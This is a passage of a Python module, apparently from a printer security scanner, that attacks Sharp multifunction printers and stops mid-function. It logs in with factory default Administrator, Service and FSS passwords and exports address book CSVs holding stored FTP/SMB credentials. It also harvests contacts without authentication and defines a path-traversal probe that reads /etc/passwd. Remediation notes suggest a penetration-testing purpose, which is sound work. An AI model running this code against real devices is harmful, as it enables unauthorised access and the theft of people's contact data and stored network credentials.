#!/usr/bin/env python3
"""
Sharp MFP module (MX / BP / AR / DX series web interface).

Derived from a captured administrator login against a Sharp MX-M6071:

    GET  /login.html?/addressbook.html          -> login form + token2 + MFPSESSIONID
    POST /login.html?/addressbook.html
         ggt_select(10009)=3&ggt_textbox(10003)=admin&action=loginbtn
         &token2=<per-session>&ordinate=0&ggt_hidden(10008)=5
    <-   302 Moved Temporarily, Location: /addressbook.html, fresh MFPSESSIONID

Two things make Sharp different from Ricoh:

  * The login name is a <select> of roles rather than free text. On a device in
    administrator-authority mode the only option is "Administrator" (value 3).
    Devices running user authentication expose a free-text login name field,
    ggt_textbox(10002), which this module fills in when present.
  * Every login form carries a one-shot CSRF token (token2) that must be
    scraped from the form immediately before posting, on the same session
    cookie. Replaying a stale token fails.
"""
import csv
import html as html_module
import io
import re
from typing import Dict, List, Optional, Tuple

import requests
from requests.exceptions import RequestException

from .base import (
    BROWSER_UA,
    Account,
    http_get,
    http_post,
    LoginResult,
    PrinterModule,
    ScanContext,
    Target,
    VulnFinding,
    log_request,
    log_response,
    page_title,
    parse_set_cookies,
)

LOGIN_PATH = "/login.html"
# The query string on login.html is the page the device sends you to after a
# successful login. addressbook.html requires administrator authority, so it
# both drives the form into admin mode and doubles as a privilege confirmation.
POST_LOGIN_TARGET = "/addressbook.html"

# Sharp exposes more than one privileged login. Each is a shim that redirects to
# /login.html?/<target>, and the target page fixes which authority the login
# form's role dropdown - ggt_select(10009) - offers:
#
#   /service_login.html -> /login.html?/service_testpage.html   role 4 "Service"
#   /fss_default.html   -> /login.html?/fss_default.html        role 7 "FSS"
#
# The login exchange is otherwise identical to the administrator flow, so the
# module only has to point attempt_login() at the right target page. The role
# value itself is read from the form, never hard-coded, since it is the only
# option the target page presents.
SERVICE_LOGIN_TARGET = "/service_testpage.html"
FSS_LOGIN_TARGET = "/fss_default.html"
ROLE_TARGETS = {
    "administrator": POST_LOGIN_TARGET,
    "service": SERVICE_LOGIN_TARGET,
    "fss": FSS_LOGIN_TARGET,
}

# Data Import/Export (CSV Format), under System Settings. Exporting is a three
# step dance: scrape the form for its tokens, POST the export request, then
# follow the 302 to the generated CSV.
STORAGE_BACKUP_PATH = "/sysmgt_storagebackup_csv.html"
EXPORT_RADIO_FIELD = "ggt_radio(50)"
EXPORT_TYPE_ADDRESS_BOOK = "33"     # the other option, 23, is User Register Information

# Scan-to-folder destinations ride in the same address book CSV as contacts.
# Each protocol spreads over a group of columns sharing a prefix; a row is a
# folder destination when any of its location or credential columns is filled.
# (label, prefix) - column names are matched case-insensitively as <prefix>-*.
SCAN_FOLDER_PROTOCOLS = [("FTP", "ftp"), ("SMB", "smb"), ("NetFolder", "netfolder")]
_FOLDER_HOST_COLS = ("host", "server")
_FOLDER_PATH_COLS = ("directory", "path", "folder")
_FOLDER_USER_COLS = ("username", "user")
_FOLDER_PASS_COLS = ("password", "passwd")

ROLE_SELECT_FIELD = "ggt_select(10009)"     # "Login Name" dropdown
LOGIN_NAME_FIELD = "ggt_textbox(10002)"     # free-text login name (user-auth mode)
PASSWORD_FIELD = "ggt_textbox(10003)"       # "Password"

_FORM_RE = re.compile(r"<form[^>]*name=\"login\"[^>]*>(.*?)</form>", re.S | re.I)


def _form_block(html: str, name: str) -> Optional[str]:
    """Pull out the inner HTML of a named <form>."""
    pattern = re.compile(r"<form[^>]*name=\"" + re.escape(name) + r"\"[^>]*>(.*?)</form>", re.S | re.I)
    m = pattern.search(html or "")
    return m.group(1) if m else None
_INPUT_RE = re.compile(r"<input\b([^>]*)>", re.S | re.I)
_SELECT_RE = re.compile(r"<select[^>]*name=\"([^\"]+)\"[^>]*>(.*?)(?:</select>)", re.S | re.I)
_OPTION_RE = re.compile(r"<option[^>]*value=\"([^\"]*)\"([^>]*)>\s*([^<]*)", re.S | re.I)
_ATTR_RE = re.compile(r"(\w[\w-]*)\s*=\s*\"([^\"]*)\"", re.S)
_MODEL_RE = re.compile(r"[-–]\s*([A-Z]{2}[A-Z0-9][A-Z0-9\-]*)\s*$")
EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")

ADDRESS_BOOK_PATH = "/addressbook.html"

# Pre-authenticated Local File Inclusion published in Pierre Kim's June 2024
# advisory (no-CVE section in that report). The device's manual-download
# handler at /installed_emanual_down.html reads whatever ``path=`` names,
# relative to /mnt/std_data, so a traversal of ../../../ hits the root of the
# printer's filesystem. /etc/passwd is small, harmless, always present, and
# unmistakable: a real device answers with a line starting root:...:0:0:. We
# use that as the safest possible confirmation - it does not touch coredumps
# (which carry cleartext user passwords) or the /mnt/std04/DBMS/uaccnt
# configuration files (which are the pentester's real prize but also real
# user data that we have no reason to persist in this scanner's output).
LFI_PATH = "/installed_emanual_down.html"
LFI_PROBE_PATH_ARG = "/manual/../../../etc/passwd"
_LFI_PASSWD_RE = re.compile(r"^root:[^:\n]*:0:0:", re.M)

# Sharp advisory (JVN VU#93051062, published 2024-05-31), covered by:
#   https://global.sharp/products/copier/info/info_security_2024-05.html
# Referenced by every advisory finding below as the remediation pointer.
SHARP_ADVISORY = "Sharp advisory JVN#VU93051062 (2024-05-31)"
_TABLE_RE = re.compile(r"<table[^>]*>(.*?)</table>", re.S | re.I)
_ROW_RE = re.compile(r"<tr[^>]*>(.*?)</tr>", re.S | re.I)
_CELL_RE = re.compile(r"<t([dh])[^>]*>(.*?)</t\1>", re.S | re.I)
_TAG_RE = re.compile(r"<[^>]+>")
# Each row carries the entry's member id, both as a hidden field and as the
# middle field of the checkbox value ("<index>,<memberid>,<name>"). It is the
# only reliable identity: two distinct contacts can share a name and an address.
_ROW_ID_RE = re.compile(r"addressbook_adrlistprofid\((\d+)\)", re.I)
_ROW_ID_ALT_RE = re.compile(r'value="\d+,(\d+),', re.I)
_TOTAL_RE = re.compile(r"Total\s+Address\w*\s*:?\s*(\d+)", re.I)
# "Total Address: 81   1 / 9" -> total, current page, page count
_PAGE_RE = re.compile(r"Total\s+Address\w*\s*:?\s*(\d+)\s+(\d+)\s*/\s*(\d+)", re.I)
_LIST_FORM = "adrbook"
PAGE_SIZE_FIELD = "ggt_select(9)"       # "Display Items": 10 / 20 / 50 / 100
# Every control on the list page submits the same form, and the device decides
# what to do from `action`, which the page's own validate() sets to the name of
# whichever control fired. So paging is action=nextbtn, and changing the page
# size is action=ggt_select(9) - not action=updatebtn.
NEXT_ACTION = "nextbtn"
# Safety net for the page walk: no address book should need more than this.
MAX_PAGE_WALK = 200
# What Sharp renders in a cell that holds nothing - including the single
# placeholder row an empty address book still draws.
_PLACEHOLDERS = {"", "-", "--", "------", "not set", "none"}


def _cell_text(raw: str) -> str:
    """Flatten a table cell to plain text, entities and &nbsp; included."""
    text = html_module.unescape(_TAG_RE.sub(" ", raw or ""))
    return " ".join(text.replace("\xa0", " ").split())


def read_pagination(page: str) -> Tuple[Optional[int], int, int]:
    """Return (total_entries, current_page, page_count) from the list header."""
    flat = html_module.unescape(_TAG_RE.sub(" ", page or ""))
    paged = _PAGE_RE.search(flat)
    if paged:
        return int(paged.group(1)), int(paged.group(2)), int(paged.group(3))
    total = _TOTAL_RE.search(flat)
    return (int(total.group(1)) if total else None), 1, 1


def list_form_state(page: str) -> Dict[str, str]:
    """
    Rebuild the address book form's current state: hidden fields plus whichever
    option each <select> currently has selected. Per-row profile id fields are
    dropped - they describe the rows on screen, not the query.
    """
    body = _form_block(page or "", _LIST_FORM)
    if body is None:
        return {}
    state: Dict[str, str] = {}
    for blob in _INPUT_RE.findall(body):
        attrs = _attrs(blob)
        name = attrs.get("name")
        if not name or attrs.get("type", "").lower() != "hidden":
            continue
        if name.startswith("addressbook_adrlistprofid"):
            continue
        state[name] = attrs.get("value", "")
    for name, inner in _SELECT_RE.findall(body):
        selected = [value for value, flags, _text in _OPTION_RE.findall(inner) if "selected" in flags]
        options = _OPTION_RE.findall(inner)
        state[name] = selected[0] if selected else (options[0][0] if options else "")
    return state


def largest_page_size(page: str) -> Optional[str]:
    """The form value behind the biggest "Display Items" option (usually 100)."""
    body = _form_block(page or "", _LIST_FORM)
    if body is None:
        return None
    for name, inner in _SELECT_RE.findall(body):
        if name != PAGE_SIZE_FIELD:
            continue
        best_value, best_size = None, -1
        for value, _flags, text in _OPTION_RE.findall(inner):
            digits = re.sub(r"\D", "", text)
            if digits and int(digits) > best_size:
                best_value, best_size = value, int(digits)
        return best_value
    return None


def parse_address_table(page: str) -> List[Tuple[str, str, str]]:
    """
    Pull (name, email, row_id) out of the address book table.

    Columns are located from the header row rather than assumed by position -
    the visible set varies by model and by which destination types are in use.
    row_id is the device's member id where the row exposes one, which is what
    makes de-duplication across pages safe.
    """
    for table in _TABLE_RE.findall(page or ""):
        name_col: Optional[int] = None
        mail_col: Optional[int] = None
        entries: List[Tuple[str, str, str]] = []

        for row in _ROW_RE.findall(table):
            cells = _CELL_RE.findall(row)
            if not cells:
                continue
            texts = [_cell_text(value) for _kind, value in cells]

            if any(kind.lower() == "h" for kind, _value in cells):
                for index, text in enumerate(t.lower() for t in texts):
                    if "address name" in text or text == "name":
                        name_col = index
                    elif "e-mail" in text or "email" in text:
                        mail_col = index
                continue

            if name_col is None or name_col >= len(texts):
                continue
            name = texts[name_col]
            email = ""
            if mail_col is not None and mail_col < len(texts):
                candidate = texts[mail_col]
                if "@" in candidate:
                    email = candidate
            if name.lower() in _PLACEHOLDERS and not email:
                continue
            if not (name or email):
                continue
            row_id = ""
            found = _ROW_ID_RE.search(row) or _ROW_ID_ALT_RE.search(row)
            if found:
                row_id = found.group(1)
            entries.append((name, email, row_id or f"pos:{len(entries)}:{name}:{email}"))

        if entries:
            return entries
    return []


def _attrs(blob: str) -> Dict[str, str]:
    return {k.lower(): v for k, v in _ATTR_RE.findall(blob)}


class LoginForm:
    """The parsed contents of a Sharp login form."""

    def __init__(self, html: str, name: str = "login"):
        body = _form_block(html, name)
        self.raw = body if body is not None else (html or "")
        self.fields: Dict[str, str] = {}
        self.field_types: Dict[str, str] = {}
        for blob in _INPUT_RE.findall(self.raw):
            a = _attrs(blob)
            name = a.get("name")
            if not name:
                continue
            self.field_types[name] = a.get("type", "text").lower()
            self.fields[name] = a.get("value", "")
        self.selects: Dict[str, List[Tuple[str, str]]] = {}
        for name, inner in _SELECT_RE.findall(self.raw):
            self.selects[name] = [
                (value, text.strip()) for value, _flags, text in _OPTION_RE.findall(inner)
            ]

    @property
    def token(self) -> str:
        return self.fields.get("token2", "")

    @property
    def usable(self) -> bool:
        """A real Sharp login form always exposes the password field."""
        return PASSWORD_FIELD in self.fields

    def role_value(self, wanted: str) -> Optional[str]:
        """Resolve an account label to a value in the Login Name dropdown."""
        options = self.selects.get(ROLE_SELECT_FIELD)
        if not options:
            return None
        wanted_l = (wanted or "").strip().lower()
        for value, text in options:
            if text.lower() == wanted_l or wanted_l in text.lower():
                return value
        return options[0][0]


class SharpModule(PrinterModule):
    name = "sharp"
    display_name = "Sharp MFP"
    supports_export = True
    supports_scrape = True
    supports_vuln_checks = True
    export_note = (
        "Exports via System Settings > Data Import/Export (CSV). The CSV carries stored "
        "FTP/SMB credentials for scan-to-folder destinations as well as contacts."
    )
    default_accounts = [
        Account(
            label="Administrator",
            username="Administrator",
            password="admin",
            can_export=True,
            note="Sharp factory default administrator password",
        ),
        # Technician logins. Their username doubles as the ROLE_TARGETS key that
        # points attempt_login() at the matching login target page. Neither
        # reaches System Settings > Data Import/Export, so can_export is False:
        # a Service/FSS session confirms the default credential but the address
        # book is still harvested by the unauthenticated scrape.
        Account(
            label="Service",
            username="Service",
            password="service",
            can_export=False,
            note="Sharp factory default service-mode password",
            risk_note="Technician-level service account - grants access to diagnostic functions; prioritise remediation",
        ),
        Account(
            label="FSS",
            username="FSS",
            password="servicefss",
            can_export=False,
            note="Sharp factory default FSS (field service) password",
            risk_note="Technician-level field-service account - grants access to diagnostic functions; prioritise remediation",
        ),
    ]

    # ---- fingerprint ---------------------------------------------------
    def fingerprint(self, target: Target, ctx: ScanContext) -> Tuple[bool, str]:
        url = f"{target.base_url}{LOGIN_PATH}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        log_request(ctx, "SHARP CHECK", target.hostport, "GET", url, headers)
        try:
            resp = http_get(url, ctx, headers=headers, allow_redirects=False)
        except RequestException as exc:
            return False, f"Connection error: {exc.__class__.__name__}"

        log_response(ctx, "SHARP CHECK RESPONSE", target.hostport, resp, body_limit=500)

        text = resp.text or ""
        server = resp.headers.get("Server", "")
        set_cookie = resp.headers.get("Set-Cookie", "")

        # Definitive markers: a proprietary Sharp response header and the
        # MFPSESSIONID session cookie the Sharp web stack issues.
        strong: List[str] = []
        if any(h.lower().startswith("extend-sharp") for h in resp.headers):
            strong.append("Extend-sharp-* header")
        if "MFPSESSIONID" in set_cookie:
            strong.append("MFPSESSIONID cookie")

        # Supporting markers. "Rapid Logic" is a generic embedded web server
        # used by more than just Sharp, so it never counts on its own.
        weak: List[str] = []
        if "rapid logic" in server.lower():
            weak.append("Server: Rapid Logic")
        if "ggt_textbox(" in text or "ggt_select(" in text:
            weak.append("Sharp ggt_* form fields")
        title = page_title(text)
        if title:
            weak.append(f"title '{title}'")

        model = ""
        m = _MODEL_RE.search(title)
        if m:
            model = m.group(1)

        if strong or len(weak) >= 2:
            found = strong + weak
            reason = f"Sharp MFP detected (found: {', '.join(found[:3])})"
            if model:
                reason += f" [model {model}]"
            return True, reason

        if resp.status_code == 404:
            return False, f"Not a Sharp MFP (HTTP {resp.status_code} - {LOGIN_PATH} not found)"
        return False, f"Not a Sharp MFP (no Sharp indicators, HTTP {resp.status_code})"

    # ---- login ---------------------------------------------------------
    def attempt_login(self, target: Target, account: Account, ctx: ScanContext) -> LoginResult:
        # The target page after "?" selects which authority the login form
        # offers. Administrator accounts (and any --accounts override) fall back
        # to the address book page; Service/FSS route to their own pages.
        target_page = ROLE_TARGETS.get(account.username.strip().lower(), POST_LOGIN_TARGET)
        login_url = f"{target.base_url}{LOGIN_PATH}?{target_page}"
        result = LoginResult(target=target, vendor=self.name, account=account, outcome="FAIL")

        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Upgrade-Insecure-Requests": "1",
        }

        # STEP 1: fetch the login form for a fresh token2 + session cookie.
        log_request(ctx, "SHARP LOGIN FORM", target.hostport, "GET", login_url, headers)
        try:
            form_resp = http_get(login_url, ctx, headers=headers, allow_redirects=False)
        except RequestException as exc:
            result.outcome = f"ERROR: {exc.__class__.__name__}: {exc}"
            return result

        log_response(ctx, "SHARP LOGIN FORM RESPONSE", target.hostport, form_resp, body_limit=600)

        if form_resp.status_code != 200:
            result.outcome = f"ERROR: HTTP {form_resp.status_code} fetching login form"
            result.status_code = form_resp.status_code
            return result

        form = LoginForm(form_resp.text or "")
        if not form.usable:
            result.outcome = "ERROR: login form not recognised (no password field)"
            result.status_code = form_resp.status_code
            return result

        cookies = parse_set_cookies(form_resp)
        session_id = cookies.get("MFPSESSIONID", "")

        # STEP 2: build the POST body in the order the device's own form posts it.
        data: Dict[str, str] = {}
        role_value = form.role_value(account.username)
        if role_value is not None:
            data[ROLE_SELECT_FIELD] = role_value
        if LOGIN_NAME_FIELD in form.fields:
            # User-authentication mode: the login name is typed, not selected.
            data[LOGIN_NAME_FIELD] = account.username
        data[PASSWORD_FIELD] = account.password
        data["action"] = "loginbtn"
        if form.token:
            data["token2"] = form.token
        data["ordinate"] = "0"
        # Carry through any remaining hidden fields the form declared.
        for name, value in form.fields.items():
            if name in data or name in (PASSWORD_FIELD, LOGIN_NAME_FIELD):
                continue
            if form.field_types.get(name) == "hidden":
                data[name] = value

        post_headers = dict(headers)
        post_headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": target.base_url,
            "Referer": login_url,
        })

        log_request(ctx, "SHARP LOGIN REQUEST", target.hostport, "POST", login_url,
                    post_headers, cookies, data)
        try:
            resp = http_post(login_url, ctx, headers=post_headers, cookies=cookies,
                             data=data, allow_redirects=False)
        except RequestException as exc:
            result.outcome = f"ERROR: {exc.__class__.__name__}: {exc}"
            return result

        log_response(ctx, "SHARP LOGIN RESPONSE", target.hostport, resp, body_limit=800)

        result.status_code = resp.status_code
        location = resp.headers.get("Location", "")
        new_cookies = parse_set_cookies(resp)
        session_id = new_cookies.get("MFPSESSIONID", session_id)

        # A successful Sharp login answers 302 to the requested page and hands
        # back a new MFPSESSIONID. A rejected one re-renders the login form.
        if resp.status_code != 302:
            body = resp.text or ""
            if PASSWORD_FIELD in body:
                result.detail = "login form re-rendered"
            result.outcome = "FAIL"
            return result

        if "login.html" in location.lower() or not location:
            result.detail = f"redirected back to {location or 'login'}"
            result.outcome = "FAIL"
            return result

        result.session = {
            "cookies": {"MFPSESSIONID": session_id} if session_id else new_cookies,
            "base_url": target.base_url,
            "landing": location,
        }

        # STEP 3: confirm the session really is privileged by loading the page
        # the device redirected us to. Contents are inspected, never stored.
        confirmed, detail = self._confirm_session(target, result.session, ctx, location)
        if confirmed is False:
            result.outcome = "FAIL"
            result.detail = detail or "session did not survive redirect"
            return result

        result.outcome = "SUCCESS"
        result.detail = detail or f"302 -> {location}"
        return result

    # ---- export --------------------------------------------------------
    def export_address_book(self, result: LoginResult,
                            ctx: ScanContext) -> Tuple[str, str, Optional[str]]:
        """
        Pull the address book out through System Settings > Data Import/Export.

            GET  /sysmgt_storagebackup_csv.html     -> form + token1/token2
            POST /sysmgt_storagebackup_csv.html
                 action=export_btn&ggt_radio(50)=33 -> 302, Location: the CSV
            GET  <Location>                         -> text/csv attachment
        """
        hostport = result.target.hostport
        session = result.session or {}
        cookies = session.get("cookies") or {}
        if not cookies:
            return hostport, "ERROR: No session data available", None

        base_url = session.get("base_url", result.target.base_url)
        url = f"{base_url}{STORAGE_BACKUP_PATH}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": f"{base_url}/system.html",
        }

        # STEP 1: load the export form for its one-shot tokens.
        log_request(ctx, "SHARP EXPORT FORM", hostport, "GET", url, headers, cookies)
        try:
            page = http_get(url, ctx, headers=headers, cookies=cookies,
                            allow_redirects=False, timeout=ctx.export_timeout)
        except RequestException as exc:
            return hostport, f"ERROR: Export form request failed - {exc.__class__.__name__}: {exc}", None

        log_response(ctx, "SHARP EXPORT FORM RESPONSE", hostport, page, body_limit=400)

        if page.status_code != 200:
            return hostport, f"ERROR: Export form returned HTTP {page.status_code}", None

        form = LoginForm(page.text or "", name="storage_csv_export")
        if not form.fields:
            return hostport, ("ERROR: export form not found - the account may lack "
                              "administrator rights for System Settings"), None

        data: Dict[str, str] = {
            name: value for name, value in form.fields.items()
            if form.field_types.get(name) == "hidden"
        }
        data[EXPORT_RADIO_FIELD] = EXPORT_TYPE_ADDRESS_BOOK
        data["action"] = "export_btn"

        post_headers = dict(headers)
        post_headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": base_url,
            "Referer": url,
        })

        # STEP 2: ask the device to generate the CSV.
        log_request(ctx, "SHARP EXPORT REQUEST", hostport, "POST", url, post_headers, cookies, data)
        try:
            resp = http_post(url, ctx, headers=post_headers, cookies=cookies, data=data,
                             allow_redirects=False, timeout=ctx.export_timeout)
        except RequestException as exc:
            return hostport, f"ERROR: Export failed - {exc.__class__.__name__}: {exc}", None

        log_response(ctx, "SHARP EXPORT RESPONSE", hostport, resp, body_limit=400)

        location = resp.headers.get("Location", "")
        if resp.status_code != 302 or not location:
            return hostport, (f"ERROR: Export request returned HTTP {resp.status_code} "
                              f"instead of a download redirect"), None

        # STEP 3: collect the generated file.
        download_url = location if location.startswith("http") else f"{base_url}{location}"
        log_request(ctx, "SHARP EXPORT DOWNLOAD", hostport, "GET", download_url, headers, cookies)
        try:
            download = http_get(download_url, ctx, headers={**headers, "Referer": url},
                                cookies=cookies, allow_redirects=False,
                                timeout=ctx.export_timeout, max_bytes=16 * 1024 * 1024)
        except RequestException as exc:
            return hostport, f"ERROR: Export download failed - {exc.__class__.__name__}: {exc}", None

        log_response(ctx, "SHARP EXPORT DOWNLOAD RESPONSE", hostport, download, body_limit=200)

        if download.status_code != 200:
            return hostport, f"ERROR: Export download returned HTTP {download.status_code}", None

        body = download.text or ""
        content_type = download.headers.get("Content-Type", "")
        if "csv" not in content_type.lower() and "address" not in body[:200].lower():
            return hostport, ("ERROR: Export download was not a CSV "
                              f"(Content-Type: {content_type or 'unset'})"), None

        safe_filename = hostport.replace(":", "_").replace("/", "_")
        output_file = f"{ctx.output_dir}/addressbook_{self.name}_{safe_filename}.csv"
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(body)

        entries = max(0, len([line for line in body.splitlines() if line.strip()]) - 1)
        return hostport, f"SUCCESS: Exported {entries} entry/entries to {output_file}", output_file

    # ---- unauthenticated harvest ---------------------------------------
    def scrape_contacts(self, target: Target, ctx: ScanContext,
                        session: Optional[Dict] = None) -> Tuple[List[str], List[str], str]:
        """
        Read the address book straight off /addressbook.html.

        Plenty of Sharp MFPs render the full contact table to anonymous
        visitors, so this is the fallback when the default credentials do not
        work or the CSV export is unavailable. Any session we already hold is
        reused, but none is required.

        The page size cannot be changed without an administrative session, so a
        device with more contacts than fit on one page yields only that page.
        The returned message always states how many of the device's declared
        total were actually collected, so a short read is never silent.
        """
        url = f"{target.base_url}{ADDRESS_BOOK_PATH}"
        cookies = (session or {}).get("cookies") or {}
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }

        log_request(ctx, "SHARP ADDRESS BOOK", target.hostport, "GET", url, headers, cookies)
        try:
            resp = http_get(url, ctx, headers=headers, cookies=cookies,
                            allow_redirects=False, timeout=ctx.export_timeout,
                            max_bytes=16 * 1024 * 1024)
        except RequestException as exc:
            return [], [], f"ERROR: {exc.__class__.__name__}: {exc}"

        log_response(ctx, "SHARP ADDRESS BOOK RESPONSE", target.hostport, resp, body_limit=300)

        if resp.status_code == 302:
            dest = resp.headers.get("Location", "")
            if "login" in dest.lower():
                return [], [], "SKIPPED: address book requires authentication"
            return [], [], f"SKIPPED: redirected to {dest}"
        if resp.status_code != 200:
            return [], [], f"ERROR: HTTP {resp.status_code}"

        body = resp.text or ""
        if PASSWORD_FIELD in body or page_title(body).lower().startswith("login"):
            return [], [], "SKIPPED: address book requires authentication"

        # Keep the device's session so page state survives across requests.
        cookies = dict(cookies)
        for name, value in parse_set_cookies(resp).items():
            cookies.setdefault(name, value)

        total, page, pages = read_pagination(body)
        entries = parse_address_table(body)
        if total == 0 or not entries:
            return [], [], "No address book entries on this device"

        collected: List[Tuple[str, str, str]] = []
        seen = set()
        for row in entries:
            if row[2] not in seen:
                seen.add(row[2])
                collected.append(row)

        # Widen the page before walking it - one request for 100 rows beats ten
        # requests for 10. The page size is a form control like any other, so
        # this works unauthenticated too.
        if total is not None and len(collected) < total and pages > 1:
            biggest = largest_page_size(body)
            if biggest:
                widened = self._post_list(url, cookies, ctx, body, headers,
                                          action=PAGE_SIZE_FIELD,
                                          overrides={PAGE_SIZE_FIELD: biggest})
                if widened:
                    rows = parse_address_table(widened)
                    if len(rows) > len(collected):
                        body = widened
                        total, page, pages = read_pagination(body)
                        collected, seen = [], set()
                        for row in rows:
                            if row[2] not in seen:
                                seen.add(row[2])
                                collected.append(row)

        # Walk whatever is left with the Next button.
        walked = 0
        while (total is not None and len(collected) < total and page < pages
               and walked < MAX_PAGE_WALK):
            walked += 1
            next_body = self._post_list(url, cookies, ctx, body, headers, action=NEXT_ACTION)
            if not next_body:
                break
            next_total, next_page, next_pages = read_pagination(next_body)
            if next_page == page:
                break                      # the device did not advance; stop rather than loop
            body, page, pages = next_body, next_page, next_pages
            if next_total is not None:
                total = next_total
            for row in parse_address_table(body):
                if row[2] not in seen:
                    seen.add(row[2])
                    collected.append(row)

        emails = [email for _name, email, _row_id in collected if email]
        names = [name for name, _email, _row_id in collected if name]

        if total is None:
            message = f"SUCCESS: Harvested {len(collected)} entry/entries"
        elif len(collected) < total:
            message = (f"PARTIAL: Harvested {len(collected)} of {total} entry/entries "
                       f"(stopped on page {page} of {pages})")
        else:
            message = f"SUCCESS: Harvested {len(collected)} of {total} entry/entries"
        return emails, names, message

    def _post_list(self, url: str, cookies: Dict, ctx: ScanContext, page_html: str,
                   headers: Dict, action: str,
                   overrides: Optional[Dict[str, str]] = None) -> Optional[str]:
        """
        Re-submit the address book form the way the page's own validate() does:
        every current field, plus `action` naming the control that fired. The
        CSRF token is re-read from the page being submitted, since it is
        single use.
        """
        data = list_form_state(page_html)
        if not data:
            return None
        if overrides:
            data.update(overrides)
        data["action"] = action
        data["ordinate"] = "0"

        post_headers = dict(headers)
        post_headers.update({
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": url.rsplit("/", 1)[0],
            "Referer": url,
        })
        try:
            resp = http_post(url, ctx, headers=post_headers, cookies=cookies, data=data,
                             allow_redirects=False, timeout=ctx.export_timeout,
                             max_bytes=16 * 1024 * 1024)
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if not location:
                    return None
                target = location if location.startswith("http") else url.rsplit("/", 1)[0] + location
                resp = http_get(target, ctx, headers=headers, cookies=cookies,
                                allow_redirects=False, timeout=ctx.export_timeout,
                                max_bytes=16 * 1024 * 1024)
        except RequestException:
            return None
        if resp.status_code != 200:
            return None
        return resp.text or ""

    # ---- contact extraction --------------------------------------------
    def extract_contacts(self, text: str) -> Tuple[List[str], List[str]]:
        """
        Sharp exports a quoted CSV whose first row names the columns, e.g.
        address, search-id, name, ..., mail-address, fax-number, ftp-host, ...

        Columns are looked up by name rather than position, since the set varies
        with firmware and with which destination types the device supports.
        """
        content = (text or "").lstrip("\ufeff")
        if not content.strip():
            return [], []

        try:
            rows = list(csv.reader(io.StringIO(content)))
        except csv.Error:
            return EMAIL_RE.findall(content), []
        if not rows:
            return [], []

        header = [column.strip().strip('"').lower() for column in rows[0]]
        name_idx = header.index("name") if "name" in header else None
        mail_idx = header.index("mail-address") if "mail-address" in header else None

        if name_idx is None and mail_idx is None:
            # Unrecognised layout - fall back to scraping addresses out of it.
            return EMAIL_RE.findall(content), []

        emails: List[str] = []
        names: List[str] = []
        for row in rows[1:]:
            if mail_idx is not None and len(row) > mail_idx:
                value = row[mail_idx].strip()
                if value and "@" in value:
                    emails.append(value)
            if name_idx is not None and len(row) > name_idx:
                value = row[name_idx].strip()
                if value:
                    names.append(value)
        return emails, names

    def extract_scan_to_folder(self, text: str) -> List[Dict[str, str]]:
        """
        Pull scan-to-folder destinations out of the exported address book CSV.

        Columns are grouped by protocol prefix (ftp-*, smb-*, ...) and located by
        name, since firmware only emits the groups for destination types the
        device actually supports. A row counts as a folder destination once any
        host, path, or username column for a protocol is populated; the stored
        password is reported only as present/absent, never echoed.
        """
        content = (text or "").lstrip("\ufeff")
        if not content.strip():
            return []
        try:
            rows = list(csv.reader(io.StringIO(content)))
        except csv.Error:
            return []
        if len(rows) < 2:
            return []

        header = [column.strip().strip('"').lower() for column in rows[0]]
        index = {name: i for i, name in enumerate(header)}

        def cell(row: List[str], column: str) -> str:
            i = index.get(column)
            if i is None or i >= len(row):
                return ""
            return row[i].strip()

        def first(row: List[str], prefix: str, suffixes: Tuple[str, ...]) -> str:
            for suffix in suffixes:
                value = cell(row, f"{prefix}-{suffix}")
                if value:
                    return value
            return ""

        findings: List[Dict[str, str]] = []
        for row in rows[1:]:
            entry_name = cell(row, "name")
            for label, prefix in SCAN_FOLDER_PROTOCOLS:
                host = first(row, prefix, _FOLDER_HOST_COLS)
                path = first(row, prefix, _FOLDER_PATH_COLS)
                user = first(row, prefix, _FOLDER_USER_COLS)
                if not (host or path or user):
                    continue
                password = first(row, prefix, _FOLDER_PASS_COLS)
                findings.append({
                    "name": entry_name,
                    "protocol": label,
                    "host": host,
                    "path": path,
                    "username": user,
                    "has_password": "yes" if password else "no",
                })
        return findings

    def _confirm_session(self, target: Target, session: Dict, ctx: ScanContext,
                         location: str) -> Tuple[Optional[bool], str]:
        """
        Follow the post-login redirect once. Returns (True, detail) if the page
        loads as an authenticated view, (False, detail) if we were bounced back
        to the login form, or (None, detail) if the check itself failed.
        """
        url = location if location.startswith("http") else f"{target.base_url}{location}"
        headers = {
            "User-Agent": BROWSER_UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": f"{target.base_url}{LOGIN_PATH}",
        }
        log_request(ctx, "SHARP SESSION CHECK", target.hostport, "GET", url,
                    headers, session.get("cookies", {}))
        try:
            resp = http_get(url, ctx, headers=headers,
                            cookies=session.get("cookies", {}), allow_redirects=False)
        except RequestException as exc:
            return None, f"confirmation request failed: {exc.__class__.__name__}"

        log_response(ctx, "SHARP SESSION CHECK RESPONSE", target.hostport, resp, body_limit=400)

        body = resp.text or ""
        title = page_title(body)
        if resp.status_code == 302:
            dest = resp.headers.get("Location", "")
            if "login.html" in dest.lower():
                return False, "session rejected (bounced to login.html)"
            return None, f"confirmation redirected to {dest}"
        if resp.status_code != 200:
            return None, f"confirmation returned HTTP {resp.status_code}"
        if PASSWORD_FIELD in body or title.lower().startswith("login"):
            return False, "session rejected (login form returned)"
        return True, f"authenticated as {title or location}"

    # ---- vulnerability checks -----------------------------------------
    def check_vulnerabilities(self, target: Target, ctx: ScanContext,
                              login_result: Optional[LoginResult] = None) -> List[VulnFinding]:
        """
